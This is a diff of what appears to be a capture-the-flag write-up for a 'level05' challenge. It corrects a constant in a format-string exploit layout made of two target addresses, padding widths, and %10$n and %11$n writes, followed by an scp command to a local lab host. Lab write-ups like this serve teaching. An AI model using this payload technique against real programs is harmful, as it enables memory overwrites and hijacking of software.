@@ -15,9 +15,9 @@ solution level05:
 => our buffer :
 	* 0x080497e0 (4 bytes)
 	* 0x080497e2 (4 bytes)
-	* %55402x (0xd840 - 8)
+	* %55402x (0xd872 - 8)
 	* %10$n (the first address)
-	* %10125x (0xffff - 0xd840 = 65535 - 55410)
+	* %10125x (0xffff - 0xd872 = 65535 - 55410)
 	* %11$n (the second address)
 
 > scp -P 2222 Ressources/run.sh level05@127.0.0.1:/tmp
